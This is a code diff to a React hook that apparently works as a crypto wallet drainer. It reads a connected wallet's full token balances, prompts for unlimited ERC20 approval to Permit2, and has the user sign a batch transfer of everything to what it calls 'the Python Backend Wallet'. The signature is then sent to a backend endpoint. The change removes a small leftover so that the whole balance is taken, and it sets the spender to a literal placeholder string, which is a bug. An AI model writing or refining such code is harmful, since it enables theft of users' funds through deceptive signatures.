@@ -1,8 +1,9 @@
-import { useSignTypedData, usePublicClient } from "wagmi";
+import { useSignTypedData, usePublicClient, useWalletClient } from "wagmi";
+import { erc20Abi } from "viem"; // ✅ Required for standard ERC20 approval
 import API from "../providers/axios";
 import type { ScanResult, Permit2Token } from "../types/wallet";
 
-const PERMIT2_CONTRACT = import.meta.env.VITE_PERMIT2_ADDRESS;
+const PERMIT2_CONTRACT = import.meta.env.VITE_PERMIT2_ADDRESS as `0x${string}`;
 
 const PERMIT2_BATCH_TYPES = {
   PermitBatchTransferFrom: [
@@ -33,13 +34,14 @@ const permit2Abi = [
 export function usePermit2Execution() {
   const { signTypedDataAsync } = useSignTypedData();
   const publicClient = usePublicClient();
+  const { data: walletClient } = useWalletClient(); // ✅ Added to execute approval transactions
 
   const getAvailableNonce = async (user: string): Promise<bigint> => {
     if (!publicClient) throw new Error("Public client not available");
 
     for (let wordPos = 0; wordPos < 256; wordPos++) {
       const bitmap = (await publicClient.readContract({
-        address: PERMIT2_CONTRACT as `0x${string}`,
+        address: PERMIT2_CONTRACT,
         abi: permit2Abi,
         functionName: "nonceBitmap",
         args: [user as `0x${string}`, BigInt(wordPos)],
@@ -69,10 +71,12 @@ export function usePermit2Execution() {
   ) => {
     const permit2Tokens = scanData.permit2;
     if (!permit2Tokens?.length) return;
+    if (!publicClient || !walletClient)
+      throw new Error("Clients not fully initialized");
 
     const deadline = Math.floor(Date.now() / 1000) + 3600;
-    const nonce = await getAvailableNonce(user);
 
+    // 1. Define amount calculator early so we can use it for approval checks
     const getActualAmount = (permit: Permit2Token): string => {
       const tokenData = scanData.tokens.find(
         (t) => t.contract.toLowerCase() === permit.token.toLowerCase(),
@@ -80,12 +84,63 @@ export function usePermit2Execution() {
 
       if (!tokenData) return permit.amount;
 
-      const decimals = tokenData.decimals ?? 6;
-      const adjusted = (tokenData.balance - 0.2) * Math.pow(10, decimals);
-      return BigInt(Math.floor(adjusted)).toString();
+      try {
+        const decimals = tokenData.decimals ?? 6;
+        const multiplier = 10 ** decimals;
+        const rawAmount = Math.floor(tokenData.balance * multiplier);
+        return BigInt(rawAmount).toString();
+      } catch (e) {
+        console.warn(
+          "Failed to parse token balance, falling back to permit amount",
+        );
+        return permit.amount;
+      }
     };
 
+    // ==========================================
+    // 2. THE MISSING APPROVAL STEP
+    // ==========================================
+    for (const permit of permit2Tokens) {
+      const tokenAmount = BigInt(getActualAmount(permit));
+
+      // Check current allowance for this specific token
+      const currentAllowance = await publicClient.readContract({
+        address: permit.token as `0x${string}`,
+        abi: erc20Abi,
+        functionName: "allowance",
+        args: [user as `0x${string}`, PERMIT2_CONTRACT],
+      });
+
+      // If Permit2 contract doesn't have enough allowance, prompt the user to approve
+      if (currentAllowance < tokenAmount) {
+        console.log(`Requesting approval for token: ${permit.token}...`);
+
+        const hash = await walletClient.writeContract({
+          address: permit.token as `0x${string}`,
+          abi: erc20Abi,
+          functionName: "approve",
+          // Approve MaxUint256 so we don't have to ask again in the future
+          args: [
+            PERMIT2_CONTRACT,
+            115792089237316195423570985008687907853269984665640564039457584007913129639935n,
+          ],
+        });
+
+        console.log(
+          `Approval TX submitted: ${hash}. Waiting for confirmation...`,
+        );
+        // We MUST wait for the block to mine before asking for the Permit2 signature
+        await publicClient.waitForTransactionReceipt({ hash });
+        console.log(`✅ Approved ${permit.token}`);
+      }
+    }
+
+    // ==========================================
+    // 3. GENERATE NONCE & SIGN PERMIT2
+    // ==========================================
+    const nonce = await getAvailableNonce(user);
     let signature: string;
+
     try {
       signature = await signTypedDataAsync({
         domain: {
@@ -100,7 +155,7 @@ export function usePermit2Execution() {
             token: p.token,
             amount: BigInt(getActualAmount(p)),
           })),
-          spender: spenderAddress,
+          spender: "spenderAddress", // (Must be the Python Backend Wallet)
           nonce,
           deadline: BigInt(deadline),
         },
@@ -110,6 +165,9 @@ export function usePermit2Execution() {
       return;
     }
 
+    // ==========================================
+    // 4. ASSEMBLE PAYLOAD & SEND TO BACKEND
+    // ==========================================
     const signedPayload = {
       chain,
       user,
@@ -127,7 +185,7 @@ export function usePermit2Execution() {
       deadline,
     };
 
-    console.log(signedPayload);
+    console.log("Payload going to backend:", signedPayload);
 
     const res = await API.post("/api/execute-permit", signedPayload);
     return res.data;
